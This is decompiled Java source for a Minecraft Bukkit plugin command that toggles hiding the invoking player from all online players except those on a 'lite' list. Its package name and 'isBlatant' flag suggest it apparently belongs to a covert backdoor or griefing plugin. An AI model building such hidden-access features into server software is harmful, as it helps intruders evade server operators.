/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class VanishCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.vanish.contains(p2)) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a2.getName())) continue;
                a2.showPlayer(p2);
            }
            plugin.vanish.remove(p2);
            p2.sendMessage(Settings.PREFIX("You are now unvanished"));
        } else {
            for (Player a3 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a3.getName())) continue;
                a3.hidePlayer(p2);
            }
            plugin.vanish.add(p2);
            p2.sendMessage(Settings.PREFIX("You are now vanished"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

